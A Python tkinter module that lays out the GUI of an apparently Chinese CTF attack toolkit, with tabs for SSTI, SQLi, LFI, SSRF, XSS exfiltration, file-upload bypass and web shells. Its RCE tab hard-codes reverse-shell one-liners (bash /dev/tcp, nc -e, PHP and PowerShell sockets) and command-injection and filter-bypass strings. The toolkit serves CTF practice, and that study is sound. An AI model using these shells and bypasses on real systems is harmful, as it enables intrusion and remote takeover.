# -*- coding: utf-8 -*-
"""gui._app -- Application assembly: window layout, tabs and the GUI/CLI toggle.

从 yang_web/gui.py 机械拆分而来（相对导入升一层）, 行为等价。
"""

from ._deps import (HAS_JS_SOLVER, HAS_SQLI_LABS, lfi, php, sqli, ssrf, ssti, sys, tk, ttk, upload, xss)
from ._panels_attack import (SQLLabsPanel, UrlAttackPanel)
from ._panels_codec import (AdvancedEncodePanel, ChineseCipherPanel, CryptoPanel, DecodePanel)
from ._panels_crypto import (HashPanel, JWTPanel, MiscCryptoPanel, PayloadPanel)
from ._panels_tools import (DocsPanel, JSGamePanel, ScriptsPanel, ShellPanel, StegoPanel)
from ._routing import (_set_input, register_route)
from ._theme import (ACCENT, BG, BORDER, DARK, FG, GREEN, INPUT_BG, YELLOW, apply_theme)
from ._widgets import (_append, _clear_output, _output_area)



def run_gui():
    root = tk.Tk()
    root.title("Yang-Web Arsenal v3.6 — 全能CTF工具箱")
    root.geometry("1100x720")
    root.minsize(900, 600)
    apply_theme(root)

    # ── 状态: gui 还是 cli ──
    mode = {"current": "gui"}

    # ── 顶部标题栏 ──
    header = tk.Frame(root, bg=DARK, height=52)
    header.pack(fill=tk.X)
    header.pack_propagate(False)
    tk.Label(header, text="🔧  Yang-Web", bg=DARK, fg=ACCENT,
             font=("Cascadia Code", 16, "bold")).pack(side=tk.LEFT, padx=20, pady=10)
    mode_label = tk.Label(header, text="全能 CTF 工具箱 v3.6  ·  50+ 模块 + 8大负载 + 7引擎 + 字典扫描 + 多阶段", 
             bg=DARK, fg=YELLOW, font=("Microsoft YaHei UI", 9))
    mode_label.pack(side=tk.LEFT, pady=14)

    # ── 切换按钮 ──
    toggle_btn = tk.Button(header, text="💻 CLI",
                           bg=INPUT_BG, fg=ACCENT, relief="flat", borderwidth=1,
                           padx=14, pady=4, cursor="hand2",
                           font=("Microsoft YaHei UI", 9, "bold"),
                           activebackground=BORDER, activeforeground=ACCENT)
    toggle_btn.pack(side=tk.RIGHT, padx=16, pady=10)

    # ── 内容容器 ──
    content = tk.Frame(root, bg=BG)
    content.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

    # GUI 模式 — Notebook
    gui_frame = tk.Frame(content, bg=BG)
    notebook = ttk.Notebook(gui_frame)
    notebook.pack(fill=tk.BOTH, expand=True)

    # ★ 智能攻击面板
    url_attack_panel = UrlAttackPanel(notebook)
    notebook.add(url_attack_panel, text=" 🎯 智能攻击 ")

    # 解码
    decode_panel = DecodePanel(notebook)
    notebook.add(decode_panel, text=" 🔓 解码 ")

    # Payload 面板们

    def _add_payload_tab(title, emoji, get_fn, categories=None, search_fn=None, analyzer_fn=None):
        """Add a payload tab with optional category dropdown."""

        panel = PayloadPanel(notebook, title, emoji, get_fn, search_fn, analyzer_fn)

        if categories:
            panel.set_categories(categories)

        notebook.add(panel, text=f" {emoji} {title} ")

        return panel
    _add_payload_tab("SSTI", "🎨", ssti.get_exploit,
                     categories=list(ssti.EXPLOIT.keys()))
    _add_payload_tab("SQLi", "🗄️", sqli.get_exploit,
                     categories=list(sqli.EXPLOIT.keys()),
                     search_fn=sqli.search_payload)

    # ── LFI ──

    def _lfi_get(cat):
        data = {

            "路径遍历": {"路径遍历Payload": lfi.get_path_traversal()},

            "敏感文件(Linux)": lfi.get_sensitive_files("Linux"),

            "敏感文件(Windows)": lfi.get_sensitive_files("Windows"),

            "PHP伪协议": lfi.get_php_wrappers(),

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
    _add_payload_tab("LFI", "📂", _lfi_get,
                     categories=["路径遍历", "敏感文件(Linux)", "敏感文件(Windows)", "PHP伪协议"])

    # ── SSRF ──

    def _ssrf_get(cat):
        data = {

            "云元数据": ssrf.get_cloud_metadata(),

            "绕过技巧": {"SSRF Bypass": ssrf.get_bypass()},

            "常见端口": ssrf.get_common_ports(),

            "内网地址": {"内网IP段": ssrf.get_internal_ranges()},

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
    _add_payload_tab("SSRF", "🌐", _ssrf_get,
                     categories=["云元数据", "绕过技巧", "常见端口", "内网地址"])

    # ── XSS ──

    def _xss_get(cat):
        data = {

            "检测Payload": {"XSS检测": xss.get_detection()},

            "数据外传": {"Exfiltration": xss.get_exfiltration()},

            "WAF绕过": xss.get_bypass(),

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
    _add_payload_tab("XSS", "💉", _xss_get,
                     categories=["检测Payload", "数据外传", "WAF绕过"])

    # ── PHP ──

    def _php_get(cat):
        data = {

            "Magic Hash": {"MD5(0e...)": php.MAGIC_HASHES.get("MD5 (0e...)", [])[:15]},

            "弱类型比较": {k: [i.get("example", str(i)) for i in v]

                        for k, v in php.TYPE_JUGGLING.items()},

            "RCE Bypass": {"常见绕过": php.PHP_RCE_BYPASS.get("常见命令执行函数", [])[:15]},

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
    _add_payload_tab("PHP", "🐘", _php_get,
                     categories=["Magic Hash", "弱类型比较", "RCE Bypass"])

    # ── Upload ──

    def _upload_get(cat):
        """Get upload payloads, filtered by category."""
        ext_sections = {}
        for k, v in upload.EXT_BYPASS.items():
            ext_sections[k] = v
        mime_items = []
        for k, v in upload.MIME_HEADER_FAKE.items():
            mime_items.append(f"{k}: Content-Type={v['Content-Type']}  |  文件头={v['文件头hex']}")
        content_sections = {}
        for k, v in upload.CONTENT_BYPASS.items():
            content_sections[k] = v
        all_data = {
            "后缀绕过": ext_sections,
            "大小写混淆": {"大小写混合": upload.EXT_BYPASS.get("大小写混合", [])},
            "多后缀组合": {"多后缀组合": upload.EXT_BYPASS.get("多后缀组合", [])},
            "NTFS & 空格点": {
                "NTFS 数据流": upload.EXT_BYPASS.get("NTFS 数据流 (Win)", []),
                "空格/点技巧": upload.EXT_BYPASS.get("空格/点技巧 (Win)", []),
            },
            "路径截断": {"路径截断": upload.EXT_BYPASS.get("路径截断", [])},
            "MIME伪造": {"Content-Type & 文件头": mime_items},
            "图片马内容绕过": content_sections,
            "一句话木马": {
                "eval版": [upload.generate_image_shell("eval")],
                "system版": [upload.generate_image_shell("system")],
                "极简版": [upload.generate_image_shell("one_liner")],
            },
            ".htaccess/.user.ini": {
                ".htaccess": [upload.generate_htaccess()],
                ".user.ini": [upload.generate_userini(), upload.generate_userini("shell.jpg")],
            },
            "高级技巧": {},
        }
        try:
            if hasattr(upload, 'ADVANCED_BYPASS'):
                all_data["高级技巧"] = upload.ADVANCED_BYPASS
        except Exception:
            pass
        try:
            if hasattr(upload, 'get_parse_vuln'):
                all_data["解析漏洞"] = upload.get_parse_vuln()
        except Exception:
            pass
        return all_data if not cat or cat == "全部" else {cat: all_data.get(cat, {})}

    def _upload_analyze(blacklist_str):
        """GUI 靶场黑名单分析."""
        import re
        ALL_EXTS = {'php','php3','php4','php5','php7','php8','phtml','pht','phps','phar','shtml','cgi'}
        blocked = set(re.findall(r'[a-zA-Z0-9]+', blacklist_str.lower()))
        lines = []
        lines.append(f"🎯 靶场黑名单分析")
        lines.append(f"  已拦截: {', '.join(sorted(blocked))}")
        safe = sorted(ALL_EXTS - blocked)
        if safe:
            lines.append(f"")
            lines.append(f"✅ 可用后缀 (不在黑名单):")
            for ext in safe:
                marker = " ⭐推荐" if ext in ('pht','phtml') else ""
                lines.append(f"  • .{ext}{marker}")
        else:
            lines.append(f"\n❌ 所有常见后缀均在黑名单中")
        lines.append(f"")
        lines.append(f"🔤 大小写混合策略:")
        for v in ['Php','pHp','PHP','pHp5','PhP']:
            ext = v.lower()
            tag = "✅" if ext in blocked else "⚪"
            lines.append(f"  {tag} {v}")
        lines.append(f"")
        lines.append(f"📦 其他绕过:")
        lines.append(f"  • 双后缀: shell.php.jpg")
        lines.append(f"  • NTFS数据流: shell.php::$DATA")
        lines.append(f"  • 空格/点: shell.php .  (Windows)")
        return '\n'.join(lines)
    _add_payload_tab("Upload", "📤", _upload_get,
                     categories=["后缀绕过", "大小写混淆", "多后缀组合", "NTFS & 空格点",
                                  "路径截断", "MIME伪造", "图片马内容绕过", "一句话木马",
                                  ".htaccess/.user.ini", "解析漏洞", "高级技巧"],
                     analyzer_fn=_upload_analyze)

    # ── RCE ──

    def _rce_get(cat):
        data = {
            "反弹Shell": {"各语言反弹Shell": [
                "bash -i >& /dev/tcp/IP/PORT 0>&1",
                "nc -e /bin/sh IP PORT",
                "python3 -c 'import socket,subprocess,os;s=socket.socket();...'",
                "php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('IP',PORT)...\"",
            ]},
            "命令注入链接符": {"链接符": [";", "|", "||", "&&", "&", "%0a", "`", "$(cmd)"]},
            "空格绕过": {"绕过技巧": ["${IFS}", "$IFS$9", "<>", "{ls,-la}", "%09", "%20"]},
            "关键字绕过": {"绕过技巧": ["c''at", "c\\at", "ca$*t", "/???/c?t", "c'a't"]},
        }
        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
    _add_payload_tab("RCE", "💻", _rce_get,
                     categories=["反弹Shell", "命令注入链接符", "空格绕过", "关键字绕过"])

    # Hash
    notebook.add(HashPanel(notebook), text=" 🔍 Hash ")

    # JWT
    notebook.add(JWTPanel(notebook), text=" 🔑 JWT ")

    # Scripts — 内嵌 CTF 脚本库
    notebook.add(ScriptsPanel(notebook), text=" 📦 脚本库 ")
    adv_encode_panel = AdvancedEncodePanel(notebook)
    notebook.add(adv_encode_panel, text=" 高级编码 ")
    chinese_cipher_panel = ChineseCipherPanel(notebook)
    notebook.add(chinese_cipher_panel, text=" 中文密码 ")
    crypto_panel = CryptoPanel(notebook)
    notebook.add(crypto_panel, text=" 加解密 ")
    notebook.add(ShellPanel(notebook), text=" Shell ")
    notebook.add(StegoPanel(notebook), text=" 隐写分析 ")

    # Misc Crypto — 20+ common cipher types
    misc_crypto_panel = MiscCryptoPanel(notebook)
    notebook.add(misc_crypto_panel, text=" 🔐 Misc Crypto ")

    # ── 面板间数据流：注册「送到下一步」的接收端 ──
    def _route_to(target_panel, attr):
        def _handle(text):
            _set_input(getattr(target_panel, attr, None), text)
            try:
                notebook.select(target_panel)
            except tk.TclError:
                pass
        return _handle
    register_route("解码", _route_to(decode_panel, "input_text"))
    register_route("高级编码", _route_to(adv_encode_panel, "input_text"))
    register_route("中文密码", _route_to(chinese_cipher_panel, "input_text"))
    register_route("加解密", _route_to(crypto_panel, "input_text"))
    register_route("Misc Crypto", _route_to(misc_crypto_panel, "io_entry"))

    # 📚 CTF 知识文档
    notebook.add(DocsPanel(notebook), text=" 📚 文档 ")

    # 🔫 SQLi-LABS 专项
    if HAS_SQLI_LABS:
        notebook.add(SQLLabsPanel(notebook), text=" 🔫 SQLi靶场 ")

    # 🎮 JS/游戏挑战
    if HAS_JS_SOLVER:
        notebook.add(JSGamePanel(notebook), text=" 🎮 JS游戏 ")

    # ── CLI 模式 — 终端面板 (初始隐藏) ──
    cli_frame = tk.Frame(content, bg=DARK)

    # 终端输出区
    cli_output_frame, cli_output = _output_area(cli_frame, 30)
    cli_output_frame.pack(fill=tk.BOTH, expand=True, padx=6, pady=(6, 0))
    cli_output.configure(bg=DARK, fg=GREEN, font=("Cascadia Code", 10),
                         insertbackground=GREEN)

    # 底部输入行
    input_bar = tk.Frame(cli_frame, bg=DARK, height=34)
    input_bar.pack(fill=tk.X, padx=6, pady=6)
    input_bar.pack_propagate(False)
    prompt_label = tk.Label(input_bar, text=">>>", bg=DARK, fg=YELLOW,
                            font=("Cascadia Code", 11, "bold"))
    prompt_label.pack(side=tk.LEFT, padx=(6, 2), pady=4)
    cli_entry = tk.Entry(input_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
                         relief="flat", borderwidth=0,
                         font=("Cascadia Code", 11))
    cli_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3, padx=(2, 6))

    # ── CLI 历史与命令执行 ──
    import io
    from ..cli import main as cli_main
    cli_history = []
    history_idx = [0]

    def _run_cli_cmd(cmd_text):
        _append(cli_output, f"{'>'*3} {cmd_text}", "input")
        if not cmd_text.strip():
            return
        cli_history.append(cmd_text)
        history_idx[0] = len(cli_history)

        # 内置命令
        if cmd_text.strip().lower() in ("clear", "cls"):
            _clear_output(cli_output)
            return
        if cmd_text.strip().lower() in ("help", "-h", "--help"):
            _append(cli_output, """
  Commands (same as CLI):
    decode BASE64 <text>       decode <text>           hashid <hash>
    encode BASE64 <text>       encode <text>           jwt <token>
    ssti python <tpl>          ssti <engine> <tpl>     scripts --run <name>
    sqli mysql <payload>       sqli <db> <payload>     scripts --search <kw>
    lfi <target>               lfi <path>              solve <url>
    ssrf <target>              ssrf <url>              scan dirs|files
    xss <target>               xss <context>           misc (密码知识库)
    rce <target>               rce <cmd>               clear, help, exit
    php <payload>               php <type>

  Tip: prefix all CLI-style args as-is, e.g.  scripts --run 'rsa_toolkit'
""")
            return
        if cmd_text.strip().lower() in ("exit", "quit"):
            return  # handled by toggle

        # Capture stdout
        old_stdout = sys.stdout
        old_stderr = sys.stderr
        buf = io.StringIO()
        sys.stdout = buf
        sys.stderr = buf
        try:
            # 拆分参数 (处理引号)
            import shlex
            try:
                args = shlex.split(cmd_text)
            except ValueError:
                args = cmd_text.split()
            sys.argv = ["yang_web"] + args
            try:
                cli_main()
            except SystemExit:
                pass
            out = buf.getvalue()
            if out.strip():
                for line in out.rstrip().split("\n"):
                    _append(cli_output, line)
            else:
                _append(cli_output, "(ok)")
        except Exception as e:
            _append(cli_output, f"Error: {e}")
        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr
            buf.close()

    def _on_cli_enter(event):
        cmd = cli_entry.get().strip()

        if cmd.lower() in ("exit", "quit"):
            cli_entry.delete(0, tk.END)

            _toggle_mode()

            return

        _run_cli_cmd(cmd)

        cli_entry.delete(0, tk.END)

    def _on_cli_up(event):
        if not cli_history:
            return "break"

        if history_idx[0] > 0:
            history_idx[0] -= 1

        cli_entry.delete(0, tk.END)

        cli_entry.insert(0, cli_history[history_idx[0]])

        return "break"

    def _on_cli_down(event):
        if not cli_history:
            return "break"

        if history_idx[0] < len(cli_history) - 1:
            history_idx[0] += 1

            cli_entry.delete(0, tk.END)

            cli_entry.insert(0, cli_history[history_idx[0]])

        else:
            history_idx[0] = len(cli_history)

            cli_entry.delete(0, tk.END)

        return "break"
    cli_entry.bind("<Return>", _on_cli_enter)
    cli_entry.bind("<Up>", _on_cli_up)
    cli_entry.bind("<Down>", _on_cli_down)

    def _show_cli_welcome():
        _append(cli_output, "▔" * 60)

        _append(cli_output, "  Yang-Web CLI  —  嵌入式终端")

        _append(cli_output, f"  41 脚本  ·  15 模块  ·  离线运行")

        _append(cli_output, "▔" * 60)

        _append(cli_output, "  Type 'help' for commands, 'exit' to return to GUI")

        _append(cli_output, "")

    # ── 模式切换逻辑 ──

    def _toggle_mode():
        if mode["current"] == "gui":
            # 切换到 CLI
            gui_frame.pack_forget()
            cli_frame.pack(fill=tk.BOTH, expand=True)
            mode["current"] = "cli"
            toggle_btn.configure(text="🖥 GUI", fg=YELLOW)
            mode_label.configure(text="命令行模式  ·  Type 'help'  ·  'exit' 返回 GUI")

            # 欢迎信息
            _clear_output(cli_output)
            _show_cli_welcome()
            cli_entry.focus_set()
        else:
            # 切换回 GUI
            cli_frame.pack_forget()
            gui_frame.pack(fill=tk.BOTH, expand=True)
            mode["current"] = "gui"
            toggle_btn.configure(text="💻 CLI", fg=ACCENT)
            mode_label.configure(text="全能 CTF 工具箱 v2.0  ·  50+ 模块 + 8大负载 + 6引擎")
    toggle_btn.configure(command=_toggle_mode)

    # 初始显示 GUI
    gui_frame.pack(fill=tk.BOTH, expand=True)

    # ── 底部状态栏 ──
    status = tk.Frame(root, bg=DARK, height=28)
    status.pack(fill=tk.X, side=tk.BOTTOM)
    status.pack_propagate(False)
    tk.Label(status, text="Yang-Web v1.4.0  |  GUI+CLI 双模式  |  上传靶场分析 + SQLi认证绕过  |  💻 切换",
             bg=DARK, fg=BORDER, font=("Microsoft YaHei UI", 8)).pack(side=tk.LEFT, padx=16, pady=4)
    root.mainloop()
